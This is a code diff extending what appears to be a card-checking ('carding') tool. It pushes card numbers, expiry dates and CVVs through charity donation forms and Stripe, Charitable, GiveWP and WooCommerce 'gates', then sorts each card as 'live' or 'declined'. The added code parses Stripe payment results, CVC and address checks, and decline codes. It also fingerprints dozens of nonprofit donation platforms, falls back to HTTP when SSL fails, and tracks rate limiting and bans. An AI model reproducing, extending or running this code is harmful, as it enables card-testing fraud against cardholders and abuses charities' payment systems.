@@ -453,15 +453,25 @@ def _check_hybrid(cc, mes, ano, cvv, site_url, donate_path, country_code="US"):
                                   f_name, l_name, email, country_code=country_code)
     s.close()
 
-    if _is_refresh_error(result_msg):
-        return {**_error_result(cc, mes, ano, cvv, result_msg), "brand": card_brand}
+    if isinstance(result_msg, str):
+        if _is_refresh_error(result_msg):
+            return {**_error_result(cc, mes, ano, cvv, result_msg), "brand": card_brand}
+        status, detail = _parse_donation_result(result_msg)
+        pi_data = {"card_checks": {}, "charge_outcome": {}, "pi_status": None}
+    else:
+        pi_data = result_msg
+        status = pi_data.get("status", "declined")
+        detail = pi_data.get("detail", "Unknown")
 
-    status, detail = _parse_donation_result(result_msg)
     label = "Approved" if status in ("live", "charged") else "Declined"
     return {
         "status": status, "cc": f"{cc}|{mes}|{ano}|{cvv}",
         "brand": card_brand, "detail": f"[H] {detail}",
-        "gate": "Stripe Hybrid", "result": f"{label} - {cc}|{mes}|{ano}|{cvv} | [H] {detail}"
+        "gate": "Stripe Hybrid", "result": f"{label} - {cc}|{mes}|{ano}|{cvv} | [H] {detail}",
+        "card_checks": pi_data.get("card_checks", {}),
+        "charge_outcome": pi_data.get("charge_outcome", {}),
+        "pi_status": pi_data.get("pi_status"),
+        "last_payment_error": pi_data.get("last_payment_error"),
     }
 
 
@@ -623,17 +633,27 @@ def _do_check(s, cc, mes, ano, cvv, site_url, donate_path, country_code="US"):
 
     logger.info("Stripe donation submitted")
 
-    if _is_refresh_error(result_msg):
-        return {**_error_result(cc, mes, ano, cvv, result_msg), "_retry": True, "brand": card_brand or "N/A"}
+    if isinstance(result_msg, str):
+        if _is_refresh_error(result_msg):
+            return {**_error_result(cc, mes, ano, cvv, result_msg), "_retry": True, "brand": card_brand or "N/A"}
+        status, detail = _parse_donation_result(result_msg)
+        pi_data = {"card_checks": {}, "charge_outcome": {}, "pi_status": None}
+    else:
+        pi_data = result_msg
+        status = pi_data.get("status", "declined")
+        detail = pi_data.get("detail", "Unknown")
 
-    status, detail = _parse_donation_result(result_msg)
     logger.info(f"Stripe result: {status}")
 
     label = "Approved" if status in ("live", "charged") else "Declined"
     return {
         "status": status, "cc": f"{cc}|{mes}|{ano}|{cvv}",
         "brand": card_brand or "N/A", "detail": detail,
-        "gate": "Stripe Charitable", "result": f"{label} - {cc}|{mes}|{ano}|{cvv} | {detail}"
+        "gate": "Stripe Charitable", "result": f"{label} - {cc}|{mes}|{ano}|{cvv} | {detail}",
+        "card_checks": pi_data.get("card_checks", {}),
+        "charge_outcome": pi_data.get("charge_outcome", {}),
+        "pi_status": pi_data.get("pi_status"),
+        "last_payment_error": pi_data.get("last_payment_error"),
     }
 
 
@@ -785,15 +805,6 @@ def _submit_donation(s, site_url, pm_id, nonce_val, form_val, campaign_id,
 
         logger.info(f"Donation AJAX: {r.status_code}")
 
-        response_text = r.text
-        try:
-            rj = json.loads(response_text)
-            logger.info(f"Donation response: success={rj.get('success')}, errors={str(rj.get('errors',''))[:120]}")
-            if rj.get('requires_action'):
-                logger.info("Donation response: requires_action=True (LIVE)")
-        except Exception:
-            logger.info(f"Donation response (raw): {response_text[:150]}")
-
         if r.status_code == 429:
             _rate_limiter.record_rate_limit()
             return "Error: Rate Limited"
@@ -805,11 +816,71 @@ def _submit_donation(s, site_url, pm_id, nonce_val, form_val, campaign_id,
         if _is_ban_signal(response_text):
             _rate_limiter.record_rate_limit()
 
+        try:
+            rj = json.loads(response_text)
+        except (json.JSONDecodeError, Exception):
+            logger.info(f"Donation response (raw): {response_text[:150]}")
+            return response_text
+
+        logger.info(f"Donation response: success={rj.get('success')}, errors={str(rj.get('errors',''))[:120]}")
+
+        pi_obj = _extract_payment_intent_from_response(rj)
+        if pi_obj:
+            logger.info(f"PaymentIntent found: status={pi_obj.get('status')}")
+            pi_result = _parse_payment_intent(pi_obj)
+            logger.info(f"PI parsed: status={pi_result['status']}, detail={pi_result['detail'][:60]}")
+            return pi_result
+
+        if rj.get("requires_action"):
+            pi_secret = rj.get("payment_intent_client_secret", "") or rj.get("client_secret", "")
+            pi_id = ""
+            if pi_secret:
+                parts = pi_secret.split("_secret_")
+                if parts:
+                    pi_id = parts[0]
+            logger.info(f"Donation requires_action=True (LIVE), pi={pi_id[:20]}")
+            return {
+                "status": "live", "detail": "3DS Required (Card Live)",
+                "pi_status": "requires_action", "card_checks": {},
+                "charge_outcome": {}, "last_payment_error": None,
+            }
+
         return response_text
 
     except Exception as e:
-        logger.error("Donation submit error")
+        logger.error(f"Donation submit error: {str(e)[:60]}")
         return f"Error: {str(e)[:80]}"
+
+
+def _extract_payment_intent_from_response(rj):
+    if not isinstance(rj, dict):
+        return None
+    if rj.get("object") == "payment_intent":
+        return rj
+    pi_statuses = (
+        "succeeded", "requires_action", "requires_payment_method",
+        "requires_confirmation", "processing", "canceled"
+    )
+    for key in ("payment_intent", "paymentIntent", "intent"):
+        obj = rj.get(key)
+        if isinstance(obj, dict) and obj.get("object") == "payment_intent":
+            return obj
+        if isinstance(obj, dict) and obj.get("status") in pi_statuses:
+            return obj
+    data_obj = rj.get("data")
+    if isinstance(data_obj, dict):
+        if data_obj.get("object") == "payment_intent":
+            return data_obj
+        if data_obj.get("id", "").startswith("pi_") and data_obj.get("status") in pi_statuses:
+            return data_obj
+    if rj.get("status") in pi_statuses and rj.get("id", "").startswith("pi_"):
+        return rj
+    stripe_err = rj.get("stripe_error", {})
+    if isinstance(stripe_err, dict) and stripe_err.get("payment_intent"):
+        pi = stripe_err["payment_intent"]
+        if isinstance(pi, dict):
+            return pi
+    return None
 
 
 def _try_woocommerce_flow(s, cc, mes, ano, cvv, site_url, page_html):
@@ -888,11 +959,26 @@ def _try_woocommerce_flow(s, cc, mes, ano, cvv, site_url, page_html):
         except Exception:
             return None
 
+        pi_obj = _extract_payment_intent_from_response(js)
+        if pi_obj:
+            pi_result = _parse_payment_intent(pi_obj)
+            label = "Approved" if pi_result["status"] in ("live", "charged") else "Declined"
+            return {
+                "status": pi_result["status"], "cc": f"{cc}|{mes}|{ano}|{cvv}",
+                "brand": card_brand or "N/A", "detail": pi_result["detail"],
+                "gate": "Stripe WC", "result": f"{label} - {cc}|{mes}|{ano}|{cvv} | {pi_result['detail']}",
+                "card_checks": pi_result.get("card_checks", {}),
+                "charge_outcome": pi_result.get("charge_outcome", {}),
+                "pi_status": pi_result.get("pi_status"),
+                "last_payment_error": pi_result.get("last_payment_error"),
+            }
+
         if js.get('success') is True:
             return {
                 "status": "live", "cc": f"{cc}|{mes}|{ano}|{cvv}",
                 "brand": card_brand or "N/A", "detail": "Approved - Card Authenticated",
-                "gate": "Stripe WC", "result": f"Approved - {cc}|{mes}|{ano}|{cvv} | Approved - Card Authenticated"
+                "gate": "Stripe WC", "result": f"Approved - {cc}|{mes}|{ano}|{cvv} | Approved - Card Authenticated",
+                "card_checks": {}, "charge_outcome": {}, "pi_status": None,
             }
         else:
             err_data = js.get('data', {})
@@ -914,7 +1000,8 @@ def _try_woocommerce_flow(s, cc, mes, ano, cvv, site_url, page_html):
             return {
                 "status": status, "cc": f"{cc}|{mes}|{ano}|{cvv}",
                 "brand": card_brand or "N/A", "detail": detail,
-                "gate": "Stripe WC", "result": f"{label} - {cc}|{mes}|{ano}|{cvv} | {detail}"
+                "gate": "Stripe WC", "result": f"{label} - {cc}|{mes}|{ano}|{cvv} | {detail}",
+                "card_checks": {}, "charge_outcome": {}, "pi_status": None,
             }
     except Exception as e:
         logger.error("WooCommerce fallback error")
@@ -977,26 +1064,52 @@ def _parse_token_error(err):
 
     logger.info(f"Token response: {code or decline_code or 'processed'}")
 
-    if "insufficient" in check:
+    if "api_key_expired" in check or "invalid_api_key" in check:
+        return "error", "Invalid/Expired API Key"
+    elif "resource_missing" in check:
+        return "error", "Resource Missing (Gate Error)"
+    elif "rate_limit" in check:
+        return "error", "Rate Limited"
+    elif "parameter_missing" in check:
+        return "error", "Missing Parameter (Gate Error)"
+    elif "token_already_used" in check:
+        return "error", "Token Already Used"
+    elif "payment_intent_unexpected_state" in check:
+        return "error", "PI Unexpected State"
+    elif "amount_too_small" in check:
+        return "error", "Amount Too Small"
+    elif "amount_too_large" in check:
+        return "error", "Amount Too Large"
+    elif "balance_insufficient" in check:
+        return "live", "Balance Insufficient (Live)"
+    elif "not_sufficient_funds" in check or "insufficient" in check:
         return "live", "Insufficient Funds (Live)"
     elif "authentication_required" in check or "requires_action" in check:
         return "live", "3DS Required (Card Live)"
+    elif "setup_intent_authentication_failure" in check:
+        return "live", "Auth Failed (Card Live)"
     elif "approve_with_id" in check:
         return "live", "Approved with ID (Live)"
     elif "card_velocity_exceeded" in check:
         return "live", "Activity Limit (Live)"
     elif "withdrawal_count_limit_exceeded" in check:
         return "live", "Limit Exceeded (Live)"
-    elif "expired" in check:
-        return "declined", "Expired Card"
-    elif "incorrect_number" in check or ("incorrect" in check and "number" in check):
-        return "declined", "Invalid Card Number"
-    elif "invalid" in check and "number" in check:
-        return "declined", "Invalid Card Number"
+    elif "exceeds_approval_amount_limit" in check:
+        return "live", "Exceeds Limit (Live)"
+    elif "cvc_check" in check and "fail" in check:
+        return "live", "CVC Check Failed (Live)"
     elif "incorrect_cvc" in check or "security code" in check:
         return "live", "CVV Declined (Card Live)"
     elif "incorrect_zip" in check:
         return "live", "AVS Mismatch (Card Live)"
+    elif "expired_card" in check or ("expired" in check and "api_key" not in check):
+        return "declined", "Expired Card"
+    elif "incorrect_number" in check or ("incorrect" in check and "number" in check):
+        return "declined", "Invalid Card Number"
+    elif "invalid_expiry" in check:
+        return "declined", "Invalid Expiry"
+    elif "invalid" in check and "number" in check:
+        return "declined", "Invalid Card Number"
     elif "stolen_card" in check:
         return "declined", "Card Reported Stolen"
     elif "lost_card" in check:
@@ -1009,6 +1122,8 @@ def _parse_token_error(err):
         return "declined", "Pick Up Card"
     elif "restricted_card" in check:
         return "declined", "Restricted Card"
+    elif "testmode_decline" in check or "test_mode" in check:
+        return "declined", "Test Mode Decline"
     elif "live_mode_test_card" in check or "testmode" in check:
         return "declined", "Test Card Rejected"
     elif "processing_error" in check:
@@ -1016,10 +1131,6 @@ def _parse_token_error(err):
     elif "card_declined" in check:
         dc = decline_code if decline_code and decline_code != "card_declined" else ""
         return "declined", f"Card Declined ({dc})" if dc else "Card Declined"
-    elif "invalid_expiry" in check:
-        return "declined", "Invalid Expiry"
-    elif "incorrect_zip" in check:
-        return "declined", "Declined - AVS"
     elif "security_violation" in check:
         return "declined", "Security Violation"
     elif "issuer_not_available" in check or "call_issuer" in check:
@@ -1040,10 +1151,36 @@ def _parse_token_error(err):
         return "declined", "Revoked Authorization"
     elif "revocation_of_authorization" in check:
         return "declined", "Revoked Authorization"
-    elif "not_sufficient_funds" in check:
-        return "live", "Insufficient Funds (Live)"
+    elif "allowable_number_of_pin_tries_exceeded" in check or "pin_tries_exceeded" in check:
+        return "declined", "PIN Tries Exceeded"
+    elif "invalid_pin" in check:
+        return "declined", "Invalid PIN"
+    elif "offline_pin_required" in check:
+        return "declined", "Offline PIN Required"
+    elif "online_or_offline_pin_required" in check:
+        return "declined", "PIN Required"
     elif "pin" in check and ("incorrect" in check or "invalid" in check or "tries" in check):
         return "declined", "PIN Error"
+    elif "merchant_blacklist" in check:
+        return "declined", "Merchant Blacklisted"
+    elif "generic_decline" in check:
+        return "declined", "Generic Decline"
+    elif "no_action_taken" in check:
+        return "declined", "No Action Taken"
+    elif "reenter_transaction" in check:
+        return "declined", "Re-enter Transaction"
+    elif "invalid_account" in check:
+        return "declined", "Invalid Account"
+    elif "stop_payment_order" in check:
+        return "declined", "Stop Payment Order"
+    elif "refer_to_card_issuer" in check or "refer_to_issuer" in check:
+        return "declined", "Refer to Card Issuer"
+    elif "card_not_supported" in check:
+        return "declined", "Card Not Supported"
+    elif "card_account_closed" in check or "account_closed" in check:
+        return "declined", "Account Closed"
+    elif "country_code_invalid" in check:
+        return "declined", "Invalid Country Code"
     else:
         return "declined", msg[:80] if msg else "Card Declined"
 
@@ -1062,6 +1199,12 @@ def _parse_donation_result(res_text):
 
     try:
         js = json.loads(res_text)
+
+        pi_obj = _extract_payment_intent_from_response(js)
+        if pi_obj:
+            pi_result = _parse_payment_intent(pi_obj)
+            return pi_result["status"], pi_result["detail"]
+
         if js.get("success") is True:
             if js.get("requires_action"):
                 return "live", "3DS Required (Card Live)"
@@ -1212,11 +1355,190 @@ def _parse_donation_result(res_text):
         return "declined", clean_res[:80] if clean_res else "Card Declined"
 
 
+def _parse_card_checks(pm_details):
+    checks = {}
+    if not pm_details or not isinstance(pm_details, dict):
+        return checks
+    card = pm_details.get("card", {})
+    if not card:
+        card = pm_details
+    card_checks = card.get("checks", {})
+    if isinstance(card_checks, dict):
+        checks["cvc_check"] = card_checks.get("cvc_check", "unavailable")
+        checks["address_line1_check"] = card_checks.get("address_line1_check", "unavailable")
+        checks["address_postal_code_check"] = card_checks.get("address_postal_code_check", "unavailable")
+    return checks
+
+
+def _parse_charge_outcome(charge):
+    outcome = {}
+    if not charge or not isinstance(charge, dict):
+        return outcome
+    charge_outcome = charge.get("outcome", {})
+    if isinstance(charge_outcome, dict):
+        outcome["network_status"] = charge_outcome.get("network_status", "")
+        outcome["reason"] = charge_outcome.get("reason", "")
+        outcome["risk_level"] = charge_outcome.get("risk_level", "")
+        outcome["risk_score"] = charge_outcome.get("risk_score", "")
+        outcome["seller_message"] = charge_outcome.get("seller_message", "")
+        outcome["type"] = charge_outcome.get("type", "")
+    return outcome
+
+
+def _parse_payment_intent(js):
+    result = {
+        "pi_status": None,
+        "last_payment_error": None,
+        "card_checks": {},
+        "charge_outcome": {},
+        "status": "declined",
+        "detail": "Unknown",
+    }
+
+    if not isinstance(js, dict):
+        return result
+
+    pi_status = js.get("status", "")
+    result["pi_status"] = pi_status
+
+    lpe = js.get("last_payment_error")
+    if isinstance(lpe, dict):
+        result["last_payment_error"] = {
+            "code": lpe.get("code", ""),
+            "decline_code": lpe.get("decline_code", ""),
+            "message": lpe.get("message", ""),
+            "type": lpe.get("type", ""),
+        }
+        pm = lpe.get("payment_method", {})
+        if isinstance(pm, dict):
+            pm_card = pm.get("card", {})
+            if isinstance(pm_card, dict):
+                result["card_checks"] = _parse_card_checks({"card": pm_card})
+
+    charges = js.get("charges", {})
+    if isinstance(charges, dict):
+        charge_list = charges.get("data", [])
+        if isinstance(charge_list, list) and charge_list:
+            first_charge = charge_list[0]
+            if isinstance(first_charge, dict):
+                result["charge_outcome"] = _parse_charge_outcome(first_charge)
+                pm_details = first_charge.get("payment_method_details", {})
+                if isinstance(pm_details, dict) and not result["card_checks"]:
+                    result["card_checks"] = _parse_card_checks(pm_details)
+
+    latest_charge = js.get("latest_charge")
+    if isinstance(latest_charge, dict) and not result["charge_outcome"]:
+        result["charge_outcome"] = _parse_charge_outcome(latest_charge)
+        pm_details = latest_charge.get("payment_method_details", {})
+        if isinstance(pm_details, dict) and not result["card_checks"]:
+            result["card_checks"] = _parse_card_checks(pm_details)
+
+    if pi_status == "succeeded":
+        result["status"] = "charged"
+        result["detail"] = "Approved - Payment Succeeded"
+    elif pi_status == "requires_action":
+        result["status"] = "live"
+        result["detail"] = "3DS Required (Card Live)"
+    elif pi_status == "requires_payment_method":
+        if lpe and isinstance(lpe, dict):
+            code = lpe.get("decline_code", "") or lpe.get("code", "")
+            msg = lpe.get("message", "")
+            combined = f"{code} {msg}".lower()
+            if "insufficient" in combined or "not_sufficient" in combined:
+                result["status"] = "live"
+                result["detail"] = "Insufficient Funds (Live)"
+            elif "authentication_required" in combined:
+                result["status"] = "live"
+                result["detail"] = "3DS Required (Card Live)"
+            elif "incorrect_cvc" in combined or "security code" in combined:
+                result["status"] = "live"
+                result["detail"] = "CVV Declined (Card Live)"
+            elif "incorrect_zip" in combined:
+                result["status"] = "live"
+                result["detail"] = "AVS Mismatch (Card Live)"
+            elif "card_velocity_exceeded" in combined or "withdrawal_count" in combined:
+                result["status"] = "live"
+                result["detail"] = "Activity Limit (Live)"
+            elif "approve_with_id" in combined:
+                result["status"] = "live"
+                result["detail"] = "Approved with ID (Live)"
+            elif "stolen_card" in combined:
+                result["status"] = "declined"
+                result["detail"] = "Card Reported Stolen"
+            elif "lost_card" in combined:
+                result["status"] = "declined"
+                result["detail"] = "Card Reported Lost"
+            elif "fraudulent" in combined:
+                result["status"] = "declined"
+                result["detail"] = "Fraud Suspected"
+            elif "do_not_honor" in combined:
+                result["status"] = "declined"
+                result["detail"] = "Issuer/Cardholder Declined"
+            elif "expired" in combined:
+                result["status"] = "declined"
+                result["detail"] = "Expired Card"
+            elif "generic_decline" in combined or "card_declined" in combined:
+                result["status"] = "declined"
+                result["detail"] = "Card Declined"
+            elif "pickup_card" in combined:
+                result["status"] = "declined"
+                result["detail"] = "Pick Up Card"
+            elif "restricted_card" in combined:
+                result["status"] = "declined"
+                result["detail"] = "Restricted Card"
+            elif "merchant_blacklist" in combined:
+                result["status"] = "declined"
+                result["detail"] = "Merchant Blacklisted"
+            elif "try_again_later" in combined:
+                result["status"] = "declined"
+                result["detail"] = "Try Again Later"
+            elif "not_permitted" in combined or "transaction_not_allowed" in combined:
+                result["status"] = "declined"
+                result["detail"] = "Transaction Not Allowed"
+            elif "incorrect_number" in combined:
+                result["status"] = "declined"
+                result["detail"] = "Invalid Card Number"
+            else:
+                result["status"] = "declined"
+                result["detail"] = msg[:80] if msg else f"Declined ({code})" if code else "Card Declined"
+        else:
+            result["status"] = "declined"
+            result["detail"] = "Requires New Payment Method"
+    elif pi_status == "requires_confirmation":
+        result["status"] = "live"
+        result["detail"] = "Pending Confirmation (Live)"
+    elif pi_status == "processing":
+        result["status"] = "live"
+        result["detail"] = "Processing (Live)"
+    elif pi_status == "canceled":
+        result["status"] = "declined"
+        result["detail"] = "Payment Canceled"
+    elif pi_status:
+        result["status"] = "declined"
+        result["detail"] = f"PI Status: {pi_status}"
+
+    cvc = result["card_checks"].get("cvc_check", "")
+    addr = result["card_checks"].get("address_line1_check", "")
+    zip_chk = result["card_checks"].get("address_postal_code_check", "")
+    if cvc or addr or zip_chk:
+        checks_str = f"CVC:{cvc or '?'} AVS:{addr or '?'} ZIP:{zip_chk or '?'}"
+        result["detail"] = f"{result['detail']} [{checks_str}]"
+
+    outcome = result.get("charge_outcome", {})
+    if outcome.get("risk_level"):
+        result["detail"] = f"{result['detail']} Risk:{outcome['risk_level']}"
+    if outcome.get("seller_message") and outcome["seller_message"] != result["detail"]:
+        result["detail"] = f"{result['detail']} ({outcome['seller_message'][:40]})"
+
+    return result
+
+
 def _error_result(cc, mes, ano, cvv, detail):
     return {
         "status": "error", "cc": f"{cc}|{mes}|{ano}|{cvv}",
         "brand": "N/A", "detail": detail,
-        "gate": "Stripe Charitable", "result": f"Error - {cc}|{mes}|{ano}|{cvv}"
+        "gate": "Stripe Charitable", "result": f"Error - {cc}|{mes}|{ano}|{cvv}",
+        "card_checks": {}, "charge_outcome": {}, "pi_status": None,
     }
 
 
@@ -1234,7 +1556,13 @@ def detect_gate_type(full_url):
     s = _make_session()
     try:
         try:
-            r = s.get(full_url, verify=False, timeout=15, allow_redirects=True)
+            r = s.get(full_url, verify=False, timeout=20, allow_redirects=True)
+        except requests.exceptions.SSLError:
+            try:
+                alt = full_url.replace("https://", "http://") if full_url.startswith("https://") else full_url
+                r = s.get(alt, verify=False, timeout=15, allow_redirects=True)
+            except Exception:
+                return result
         except Exception:
             return result
 
@@ -1261,6 +1589,48 @@ def detect_gate_type(full_url):
         if 'stripe.js' in html or 'js.stripe.com' in html:
             stripe_signals += 2
             result["signals"].append("stripe.js")
+        if 'give-form' in html or 'givewp' in html:
+            stripe_signals += 2
+            result["signals"].append("GiveWP form")
+        if 'donorbox' in html:
+            stripe_signals += 2
+            result["signals"].append("Donorbox")
+        if 'funraise' in html:
+            stripe_signals += 2
+            result["signals"].append("Funraise")
+        if 'stripe-element' in html or 'card-element' in html:
+            stripe_signals += 2
+            result["signals"].append("Stripe Elements")
+        if 'stripe.elements' in html or 'stripeelements' in html:
+            stripe_signals += 2
+            result["signals"].append("Stripe Elements JS")
+        if 'acct_' in html:
+            stripe_signals += 1
+            result["signals"].append("Stripe account ID")
+        if 'checkout.stripe.com' in html or 'stripe-checkout' in html:
+            stripe_signals += 3
+            result["signals"].append("Stripe Checkout")
+        if 'wpforms' in html or 'gravityforms' in html or 'ninja-forms' in html:
+            stripe_signals += 1
+            result["signals"].append("WP form plugin")
+        if 'classy.org' in html or 'classy-widget' in html:
+            stripe_signals += 1
+            result["signals"].append("Classy.org")
+        if 'actionnetwork.org' in html or 'action_network' in html:
+            stripe_signals += 1
+            result["signals"].append("Action Network")
+        if 'mightycause' in html or 'razoo' in html:
+            stripe_signals += 1
+            result["signals"].append("Mightycause")
+        if 'nationbuilder' in html:
+            stripe_signals += 1
+            result["signals"].append("NationBuilder")
+        if 'qgiv' in html:
+            stripe_signals += 1
+            result["signals"].append("Qgiv")
+        if 'movember' in html:
+            stripe_signals += 1
+            result["signals"].append("Movember")
 
         if 'braintree' in html:
             braintree_signals += 2
@@ -1274,6 +1644,9 @@ def detect_gate_type(full_url):
         if 'braintree.js' in html or 'braintree-web' in html:
             braintree_signals += 2
             result["signals"].append("braintree.js")
+        if 'paypal' in html and 'braintree' in html:
+            braintree_signals += 1
+            result["signals"].append("PayPal+BT")
 
         if stripe_signals > braintree_signals:
             result["gate_type"] = "stripe"
@@ -1293,6 +1666,132 @@ def detect_gate_type(full_url):
     return result
 
 
+def _detect_form_type(page_html, soup):
+    html_lower = page_html.lower()
+
+    if '_charitable_donation_nonce' in page_html:
+        nonce_el = soup.find('input', {'name': '_charitable_donation_nonce'})
+        form_id_el = soup.find('input', {'name': 'charitable_form_id'})
+        if nonce_el and form_id_el:
+            return "charitable", "Charitable form (DOM)"
+        nonce_match = re.search(r'_charitable_donation_nonce["\s]+value=["\']([^"\']+)', page_html)
+        form_match = re.search(r'charitable_form_id["\s]+value=["\']([^"\']+)', page_html)
+        if nonce_match and form_match:
+            return "charitable", "Charitable form (regex)"
+
+    if 'give-form' in html_lower or 'give_action' in html_lower or 'give-donation' in html_lower:
+        return "givewp", "GiveWP donation form"
+
+    if 'donorbox' in html_lower or 'donorbox.org' in html_lower:
+        return "donorbox", "Donorbox embed"
+
+    if 'funraise' in html_lower or 'funraise.org' in html_lower:
+        return "funraise", "Funraise donation form"
+
+    if 'every.org' in html_lower or 'everyaction' in html_lower:
+        return "everyaction", "EveryAction/Every.org form"
+
+    if 'salesforce' in html_lower or 'force.com' in html_lower:
+        return "salesforce", "Salesforce donation page"
+
+    if 'woocommerce' in html_lower or 'wc-checkout' in html_lower:
+        return "woocommerce", "WooCommerce checkout"
+
+    if 'giveasyoulive' in html_lower:
+        return "giveasyoulive", "Give As You Live form"
+
+    if 'movember' in html_lower:
+        return "movember", "Movember donation"
+
+    if 'classy.org' in html_lower or 'classy-widget' in html_lower:
+        return "classy", "Classy.org donation"
+
+    if 'networkforgood' in html_lower or 'network for good' in html_lower:
+        return "networkforgood", "Network for Good"
+
+    if 'actionnetwork.org' in html_lower or 'action_network' in html_lower:
+        return "actionnetwork", "Action Network form"
+
+    if 'mightycause' in html_lower or 'razoo' in html_lower:
+        return "mightycause", "Mightycause/Razoo form"
+
+    if 'bloomerang' in html_lower:
+        return "bloomerang", "Bloomerang donation"
+
+    if 'kindful' in html_lower:
+        return "kindful", "Kindful donation"
+
+    if 'charityengine' in html_lower:
+        return "charityengine", "CharityEngine form"
+
+    if 'qgiv' in html_lower or 'qgiv.com' in html_lower:
+        return "qgiv", "Qgiv donation form"
+
+    if 'securepayments' in html_lower or 'secure.lglforms' in html_lower:
+        return "littlegreenlight", "Little Green Light"
+
+    if 'nationbuilder' in html_lower:
+        return "nationbuilder", "NationBuilder donation"
+
+    if 'wpforms' in html_lower or 'wp-forms' in html_lower:
+        return "wpforms", "WPForms donation"
+
+    if 'gravityforms' in html_lower or 'gform' in html_lower:
+        return "gravityforms", "Gravity Forms donation"
+
+    if 'formidable' in html_lower:
+        return "formidable", "Formidable Forms"
+
+    if 'ninja-forms' in html_lower or 'nf-form' in html_lower:
+        return "ninjaforms", "Ninja Forms"
+
+    if 'stripe-checkout' in html_lower or 'checkout.stripe.com' in html_lower:
+        return "stripe_checkout", "Stripe Checkout hosted"
+
+    stripe_indicators = [
+        'stripe.js', 'js.stripe.com', 'stripe-element', 'stripe_publishable',
+        'pk_live_', 'pk_test_', 'data-stripe', 'stripe-card-element',
+        'stripeelements', 'stripe.elements', 'card-element',
+    ]
+    if any(ind in html_lower for ind in stripe_indicators):
+        forms = soup.find_all('form')
+        for form in forms:
+            action = (form.get('action') or '').lower()
+            if any(kw in action for kw in ['donate', 'donation', 'give', 'payment', 'checkout', 'process']):
+                return "stripe_generic", f"Stripe form ({action[:40]})"
+            inputs = form.find_all('input')
+            input_names = [i.get('name', '').lower() for i in inputs]
+            if any('amount' in n or 'donation' in n or 'payment' in n for n in input_names):
+                return "stripe_generic", "Stripe payment form"
+        return "stripe_generic", "Stripe Elements detected"
+
+    donate_forms = soup.find_all('form')
+    for form in donate_forms:
+        action = (form.get('action') or '').lower()
+        classes = ' '.join(form.get('class', []) or []).lower()
+        form_id = (form.get('id') or '').lower()
+        if any(kw in f"{action} {classes} {form_id}" for kw in ['donat', 'give', 'contribut', 'payment']):
+            return "generic_donate", "Generic donation form"
+
+    iframes = soup.find_all('iframe')
+    for iframe in iframes:
+        src = (iframe.get('src') or '').lower()
+        if any(kw in src for kw in ['donate', 'give', 'payment', 'stripe', 'donorbox', 'funraise', 'classy']):
+            return "iframe_donate", f"Embedded donation ({src[:40]})"
+
+    scripts = soup.find_all('script', src=True)
+    for script in scripts:
+        src = (script.get('src') or '').lower()
+        if 'stripe' in src:
+            return "stripe_generic", f"Stripe via script ({src[:40]})"
+        if 'donorbox' in src:
+            return "donorbox", "Donorbox via script"
+        if 'funraise' in src:
+            return "funraise", "Funraise via script"
+
+    return None, None
+
+
 def setup_gate_from_url(full_url):
     from config import set_gate_setting as _set_gs, get_all_gate_settings
 
@@ -1304,10 +1803,16 @@ def setup_gate_from_url(full_url):
         "campaign_id": "",
         "stripe_account": "",
         "form_found": False,
+        "form_type": "",
         "pow_required": False,
         "pow_solved": False,
         "errors": [],
         "auto_detected": [],
+        "http_status": 0,
+        "redirect_chain": [],
+        "page_size": 0,
+        "ssl_ok": True,
+        "captcha_detected": False,
     }
 
     old_settings = get_all_gate_settings("stripe")
@@ -1319,8 +1824,13 @@ def setup_gate_from_url(full_url):
     parsed = urlparse(full_url)
     site_url = f"{parsed.scheme}://{parsed.netloc}"
     donate_path = parsed.path if parsed.path and parsed.path != "/" else "/donate/"
-    if not donate_path.endswith("/") and "." not in donate_path.split("/")[-1]:
+    query_string = parsed.query
+    if query_string:
+        donate_path = f"{donate_path}?{query_string}"
+    elif not donate_path.endswith("/") and "." not in donate_path.split("/")[-1]:
         donate_path += "/"
+    if parsed.fragment:
+        donate_path = f"{donate_path}#{parsed.fragment}"
 
     results["site_url"] = site_url
     results["donate_path"] = donate_path
@@ -1329,52 +1839,118 @@ def setup_gate_from_url(full_url):
     new_settings = {}
     try:
         try:
-            r = s.get(site_url, verify=False, timeout=15, allow_redirects=True)
-            if r.status_code != 200:
-                results["errors"].append(f"Site returned HTTP {r.status_code}")
+            r = s.get(full_url, verify=False, timeout=20, allow_redirects=True)
+            if r.status_code in (403, 503):
+                results["errors"].append(f"Site blocked/unavailable (HTTP {r.status_code})")
                 return results
+            if r.status_code == 404:
+                r = s.get(site_url, verify=False, timeout=15, allow_redirects=True)
+                if r.status_code != 200:
+                    results["errors"].append(f"Site returned HTTP {r.status_code}")
+                    return results
+        except requests.exceptions.SSLError as ssl_err:
+            results["ssl_ok"] = False
+            results["auto_detected"].append(f"SSL error: {str(ssl_err)[:40]}")
+            try:
+                if full_url.startswith("https://"):
+                    alt_url = full_url.replace("https://", "http://")
+                    r = s.get(alt_url, verify=False, timeout=15, allow_redirects=True)
+                    results["auto_detected"].append("Fallback to HTTP OK")
+                else:
+                    raise
+            except Exception as e2:
+                results["errors"].append(f"SSL error & HTTP fallback failed: {str(e2)[:50]}")
+                return results
+        except requests.exceptions.Timeout:
+            results["errors"].append("Connection timed out (20s)")
+            return results
+        except requests.exceptions.ConnectionError as e:
+            err_str = str(e)[:80]
+            if "dns" in err_str.lower() or "name resolution" in err_str.lower():
+                results["errors"].append(f"DNS resolution failed for {parsed.netloc}")
+            else:
+                results["errors"].append(f"Connection failed: {err_str[:50]}")
+            return results
         except Exception as e:
             results["errors"].append(f"Cannot reach site: {str(e)[:60]}")
             return results
 
+        results["http_status"] = r.status_code
+        results["page_size"] = len(r.text)
+        if r.history:
+            results["redirect_chain"] = [str(resp.url)[:60] for resp in r.history[:5]]
+
         results["auto_detected"].append(f"Site URL: {site_url}")
         new_settings["site_url"] = site_url
 
-        donate_url = f"{site_url}{donate_path}"
-        try:
-            r2 = s.get(donate_url, verify=False, timeout=20, allow_redirects=True)
-            if r2.status_code == 404:
-                common_paths = ["/donate/", "/donations/", "/give/", "/support/", "/contribute/", "/donation/"]
-                found = False
-                for path in common_paths:
-                    if path == donate_path:
-                        continue
-                    try:
-                        test_r = s.get(f"{site_url}{path}", verify=False, timeout=10, allow_redirects=True)
-                        if test_r.status_code == 200 and ('charitable' in test_r.text.lower() or 'donation' in test_r.text.lower() or 'stripe' in test_r.text.lower()):
-                            donate_path = path
-                            results["donate_path"] = path
-                            results["auto_detected"].append(f"Donate path: {path} (auto-found)")
-                            r2 = test_r
-                            found = True
-                            break
-                    except Exception:
-                        continue
-                if not found:
-                    results["errors"].append(f"Donate page not found at {donate_path} or common paths")
+        page_html = r.text
+        final_url = r.url
